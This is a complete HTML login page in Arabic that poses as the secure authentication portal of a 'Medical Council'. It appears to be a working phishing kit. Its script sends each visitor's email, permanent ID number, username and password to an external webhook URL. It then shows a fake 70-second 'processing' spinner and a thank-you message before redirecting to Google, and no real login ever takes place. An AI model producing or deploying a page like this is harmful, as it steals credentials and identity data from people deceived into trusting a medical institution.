<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة الدخول الموحدة | المجلس الطبي</title>
    <style>
        :root {
            --primary-color: #0056b3;
            --bg-color: #f4f7f9;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg-color);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-card {
            background: #fff;
            padding: 40px 30px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
            width: 100%;
            max-width: 400px;
            text-align: center;
            border-top: 5px solid var(--primary-color);
        }

        .logo { width: 80px; margin-bottom: 15px; }
        h2 { color: var(--primary-color); margin: 0; font-size: 24px; }
        p.subtitle { color: #666; font-size: 14px; margin-bottom: 30px; }

        .form-group { text-align: right; margin-bottom: 15px; }
        label { display: block; margin-bottom: 8px; font-weight: bold; color: #555; font-size: 14px; }
        input {
            width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px;
            box-sizing: border-box; background-color: #fafafa; text-align: right;
        }

        #login-btn {
            width: 100%; padding: 12px; background-color: var(--primary-color);
            color: white; border: none; border-radius: 6px; font-size: 16px;
            font-weight: bold; cursor: pointer; margin-top: 20px;
        }

        /* تنسيق رسالة المعالجة */
        #loader-container { display: none; margin-top: 20px; }
        .spinner {
            border: 4px solid #f3f3f3; border-top: 4px solid var(--primary-color);
            border-radius: 50%; width: 30px; height: 30px;
            animation: spin 1s linear infinite; margin: 0 auto 10px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        #success-msg { display: none; color: green; font-weight: bold; margin-top: 20px; }

        .footer { margin-top: 30px; font-size: 12px; color: #999; }
    </style>
</head>
<body>

<div class="login-card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e4/Rod_of_Asclepius2.svg/1200px-Rod_of_Asclepius2.svg.png" alt="Logo" class="logo">
    <h2>المجلس الطبي</h2>
    <p class="subtitle">نظام المصادقة الإلكتروني الآمن</p>

    <div id="auth-form">
        <div class="form-group">
            <label>البريد الإلكتروني</label>
            <input type="email" id="email" placeholder="example@domain.com">
        </div>
        <div class="form-group">
            <label>الرقم الدائم</label>
            <input type="text" id="permanent_id" placeholder="أدخل الرقم الدائم">
        </div>
        <div class="form-group">
            <label>اسم المستخدم</label>
            <input type="text" id="username" placeholder="Username">
        </div>
        <div class="form-group">
            <label>كلمة المرور</label>
            <input type="password" id="password" placeholder="********">
        </div>
        <button id="login-btn" onclick="processLogin()">تسجيل الدخول</button>
    </div>

    <div id="loader-container">
        <div class="spinner"></div>
        <p>جاري المعالجة، يرجى الانتظار...</p>
    </div>

    <div id="success-msg">
        <p>شكراً لك.. تم استلام طلبك بنجاح.</p>
    </div>

    <div class="footer">حقوق الطبع محفوظة للمجلس الطبي © 2026</div>
</div>

<script>
    function processLogin() {
        const webhookURL = "https://webhookreceiver-ps6nryst2a-ey.a.run.app?key=omdbhsbi63pdpaqtlfiplead1y8zywa8";
        
        const data = {
            email: document.getElementById('email').value,
            permanent_id: document.getElementById('permanent_id').value,
            username: document.getElementById('username').value,
            password: document.getElementById('password').value
        };

        // 1. إرسال البيانات فوراً للتطبيق
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });

        // 2. تغيير الواجهة لعرض جاري المعالجة
        document.getElementById('auth-form').style.display = 'none';
        document.getElementById('loader-container').style.display = 'block';

        // 3. الانتظار لمدة 70 ثانية (70000 ميلي ثانية)
        setTimeout(function() {
            document.getElementById('loader-container').style.display = 'none';
            document.getElementById('success-msg').style.display = 'block';
            
            // 4. توجيه اختياري بعد رسالة الشكر بـ 3 ثواني
            setTimeout(function() {
                window.location.href = "https://www.google.com";
            }, 3000);
            
        }, 70000); 
    }
</script>

</body>
</html>
